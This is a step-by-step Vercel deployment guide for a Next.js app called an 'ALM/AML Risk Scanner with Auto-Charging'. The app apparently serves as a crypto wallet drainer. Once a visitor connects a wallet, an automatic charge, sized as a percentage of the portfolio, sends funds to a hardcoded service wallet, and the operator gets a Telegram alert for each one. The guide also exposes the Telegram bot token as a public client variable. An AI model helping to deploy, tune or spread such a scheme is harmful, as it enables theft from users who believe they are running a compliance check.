# Deploying to Vercel - Step by Step

## Prerequisites

Before starting, you need:
- ✅ Vercel account (free or paid)
- ✅ GitHub/GitLab/Bitbucket account
- ✅ Your service wallet address (or use default)
- ✅ Telegram credentials (optional)

---

## Step 1: Prepare Your Code

### 1.1 Make Sure Everything is Working Locally

```bash
cd apps/web
npm run dev
```

Visit `http://localhost:3000` and verify it loads.

**Press Ctrl+C to stop the server**

### 1.2 Clean Up and Prepare

```bash
# From root directory
cd c:\Users\uwosk\Desktop\almriskscan

# Check git status
git status

# If you see "fatal: not a git repository", initialize git:
git init

# Add all files
git add .

# Commit
git commit -m "ALM Risk Scanner - Ready for Vercel deployment"
```

---

## Step 2: Push to GitHub (or GitLab/Bitbucket)

### 2.1 Create a GitHub Repository

1. Go to https://github.com/new
2. Create a new repository:
   - **Repository name:** almriskscan
   - **Description:** AML Risk Scanner with Auto-Charging
   - **Visibility:** Public or Private (your choice)
   - **Click:** Create repository

3. You'll see commands to push. Run these in your terminal:

```bash
# From your project root directory
git remote add origin https://github.com/YOUR_USERNAME/almriskscan.git
git branch -M main
git push -u origin main
```

Replace `YOUR_USERNAME` with your actual GitHub username.

### 2.2 Verify Push Succeeded

Go to your GitHub repository and verify you can see all the files.

---

## Step 3: Connect Vercel to GitHub

### 3.1 Go to Vercel Dashboard

1. Visit https://vercel.com/dashboard
2. Sign in with your Vercel account (or create one)

### 3.2 Import Project

1. Click **"Add New..."** button
2. Click **"Project"**
3. Under **"Import Git Repository"**, search for your repo:
   - Type: `almriskscan`
   - Select your repository when it appears

### 3.3 Configure Project

The import page will show:
- **Framework Preset:** Select "Next.js"
- **Root Directory:** Select `apps/web`
- **Build Command:** Should auto-fill with `npm run build`
- **Output Directory:** Should auto-fill with `.next`

**Click:** "Deploy" (but don't deploy yet - we need to add environment variables first)

---

## Step 4: Set Environment Variables

### 4.1 Go to Project Settings

In Vercel:
1. Go to your project
2. Click **Settings** (top menu)
3. Click **"Environment Variables"** (left sidebar)

### 4.2 Add Variables

Add each of these variables by clicking **"Add"**:

**1. Service Wallet Address**
- **Name:** `NEXT_PUBLIC_SERVICE_WALLET`
- **Value:** `0x1fC618a5B0AAFfC876b72288D71f3E80918c590f` (or your wallet)
- **Environments:** Select all (Production, Preview, Development)
- Click **"Save"**

**2. Telegram Bot Token**
- **Name:** `TELEGRAM_BOT_TOKEN`
- **Value:** Your bot token from @BotFather (e.g., `123456789:ABCdefGHIjklmnOPQrstuvWXYZ_1234567890`)
- **Environments:** Select all
- Click **"Save"**

**3. Telegram Chat ID**
- **Name:** `TELEGRAM_CHAT_ID`
- **Value:** Your chat ID from @userinfobot (e.g., `1234567890`)
- **Environments:** Select all
- Click **"Save"**

**4. Public Telegram Bot Token**
- **Name:** `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN`
- **Value:** Same as #2
- **Environments:** Select all
- Click **"Save"**

**5. Public Telegram Chat ID**
- **Name:** `NEXT_PUBLIC_TELEGRAM_CHAT_ID`
- **Value:** Same as #3
- **Environments:** Select all
- Click **"Save"**

**6. WalletConnect Project ID**
- **Name:** `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID`
- **Value:** `ec69905148aaa16f986896374d25cf53`
- **Environments:** Select all
- Click **"Save"**

### 4.3 Verify All Variables Are Added

You should see 6 environment variables in the list:
- ✅ NEXT_PUBLIC_SERVICE_WALLET
- ✅ TELEGRAM_BOT_TOKEN
- ✅ TELEGRAM_CHAT_ID
- ✅ NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
- ✅ NEXT_PUBLIC_TELEGRAM_CHAT_ID
- ✅ NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID

---

## Step 5: Deploy

### 5.1 Trigger Deployment

Option A: **Automatic (Recommended)**
- Just push to GitHub and Vercel will auto-deploy:
```bash
git push origin main
```

Option B: **Manual in Vercel**
1. Go to your Vercel project
2. Click **"Deployments"** tab
3. Click **"Redeploy"** on the latest deployment

### 5.2 Watch Deployment

The deployment will take 2-5 minutes. You'll see:
- 🟡 **Building** - Installing dependencies and building
- 🟡 **Optimizing** - Optimizing bundle
- 🟡 **Finalizing** - Final setup
- 🟢 **Ready** - Deployment complete!

---

## Step 6: Test Deployment

### 6.1 Get Your Vercel URL

After deployment completes:
1. Go to **"Deployments"** tab
2. Click the latest deployment
3. You'll see your URL (like `almriskscan-abc123.vercel.app`)

### 6.2 Test the Live Site

1. Open your Vercel URL in browser
2. Click "Connect Wallet"
3. Connect your wallet
4. Verify auto-charge triggers
5. Check Telegram for notification

---

## Step 7: Custom Domain (Optional)

If you want to use a custom domain:

1. In Vercel project, go to **Settings** → **Domains**
2. Click **"Add Domain"**
3. Enter your domain (e.g., `almrisk.com`)
4. Vercel will show DNS instructions
5. Follow the instructions to point domain to Vercel

---

## Troubleshooting Deployment Issues

### Issue: Build fails with "Module not found"

**Solution:**
1. Go to Vercel project → **Settings** → **Build & Development Settings**
2. Make sure:
   - Framework: Next.js
   - Root Directory: `apps/web`
   - Build Command: `npm run build`

### Issue: Environment variables not working

**Solution:**
1. Verify all 6 variables are set in **Settings** → **Environment Variables**
2. Redeploy: Go to **Deployments** and click **Redeploy**
3. Wait for new deployment to complete

### Issue: "Cannot find module" errors

**Solution:**
1. In Vercel **Settings** → **Environment Variables**
2. Check that all variables are set to "All" environments
3. Redeploy

### Issue: Wallet not connecting on Vercel

**Solution:**
1. Verify `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` is set correctly
2. Make sure it's set to all environments
3. Redeploy

### Issue: Telegram not sending notifications

**Solution:**
1. Verify `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are correct
2. Test locally first to make sure credentials work
3. Check that both variables are set to all environments
4. Redeploy

---

## Viewing Logs

### Check Build Logs

1. Go to **Deployments**
2. Click on a deployment
3. Click **"Building..."** or **"Logs"** tab
4. Scroll through logs to see any errors

### Check Runtime Logs

1. Go to **Logs** tab in project
2. View real-time logs as users interact with your site

---

## After Deployment

### 1. Monitor First Transactions

- Connect with a test wallet
- Approve a charge
- Verify:
  - Funds leave your wallet
  - Funds arrive at service wallet
  - Telegram notification arrives

### 2. Share Your URL

Your site is now live at: `https://almriskscan-xxxxx.vercel.app`

### 3. Set Up Custom Domain (Optional)

See Step 7 above for custom domain setup

### 4. Keep Git Updated

Any changes you make and push to GitHub will auto-deploy to Vercel:

```bash
# Make changes locally
git add .
git commit -m "Your message"
git push origin main
# Vercel automatically deploys!
```

---

## Making Changes After Deployment

### To Update Charge Percentage

1. Edit: `apps/web/src/utils/portfolioValue.ts`
2. Save and commit:
```bash
git add apps/web/src/utils/portfolioValue.ts
git commit -m "Updated charge percentages"
git push origin main
```
3. Vercel auto-deploys the changes (2-5 minutes)

### To Update Service Wallet

1. Go to Vercel **Settings** → **Environment Variables**
2. Click on `NEXT_PUBLIC_SERVICE_WALLET`
3. Update the value
4. Click **"Save"**
5. Click **"Redeploy"** in Deployments tab

### To Update Telegram Credentials

1. Go to Vercel **Settings** → **Environment Variables**
2. Update `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`
3. Click **"Redeploy"** in Deployments tab

---

## Production Checklist

Before going live with real money:

- ✅ Test on Vercel with small amount
- ✅ Verify charges arrive at service wallet
- ✅ Verify Telegram notifications work
- ✅ Test on multiple chains
- ✅ Monitor first 24 hours
- ✅ Have support plan ready
- ✅ Back up private keys
- ✅ Monitor service wallet balance

---

## Support & Monitoring

### Vercel Monitoring

- **Status:** https://status.vercel.com
- **Dashboard:** https://vercel.com/dashboard

### Real-Time Monitoring

1. Set up Telegram alerts (already configured)
2. Monitor Vercel logs
3. Check service wallet on blockchain explorer

### If Something Breaks

1. Check **Deployments** logs for errors
2. Rollback to previous deployment if needed
3. Fix locally and push again

---

## Summary

**Your deployment flow:**
1. Make changes locally (optional)
2. Push to GitHub: `git push origin main`
3. Vercel auto-deploys (2-5 minutes)
4. Visit your live URL
5. Monitor via Telegram notifications

**That's it! Your ALM Risk Scanner is live on Vercel!**

---

## Quick Links

- Vercel Dashboard: https://vercel.com/dashboard
- GitHub: https://github.com
- Your Project URL: `https://almriskscan-xxxxx.vercel.app`
- BotFather (Telegram): https://t.me/BotFather
- userinfobot (Telegram): https://t.me/userinfobot

---

**Need help?** Refer to:
- CONFIGURATION_GUIDE.md - For detailed settings
- QUICK_START.md - For quick reference
- This file - For deployment steps
